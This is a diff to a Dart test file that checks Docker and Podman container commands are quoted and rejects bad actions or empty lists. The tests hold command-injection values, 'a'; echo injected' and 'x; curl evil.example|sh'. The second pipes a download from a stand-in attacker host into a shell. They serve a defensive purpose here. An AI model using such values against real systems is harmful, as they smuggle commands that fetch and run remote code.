@@ -82,6 +82,25 @@ void main() {
     });
   });
 
+  test('replica lifecycle actions use the runtime and only quoted observed IDs', () {
+    for (final runtime in ['docker', 'podman']) {
+      for (final action in ['start', 'stop', 'restart', 'pause', 'unpause', 'remove']) {
+        final verb = action == 'remove' ? 'rm -f' : action;
+        expect(
+          dockerContainersAction(['first', 'second', 'first'], action, runtime: runtime),
+          "$runtime $verb 'first' 'second' 2>&1",
+        );
+      }
+      const payload = "a'; echo injected";
+      expect(
+        dockerContainersAction([payload], 'stop', runtime: runtime),
+        contains(shellQuote(payload)),
+      );
+    }
+    expect(() => dockerContainersAction([], 'stop', runtime: 'docker'), throwsArgumentError);
+    expect(() => dockerContainersAction(['first'], 'down', runtime: 'docker'), throwsArgumentError);
+  });
+
   group('actions quote their identifiers', () {
     test('a crafted container name cannot inject a command', () {
       final cmd = dockerAction(r'x; curl evil.example|sh', 'stop', runtime: 'docker');
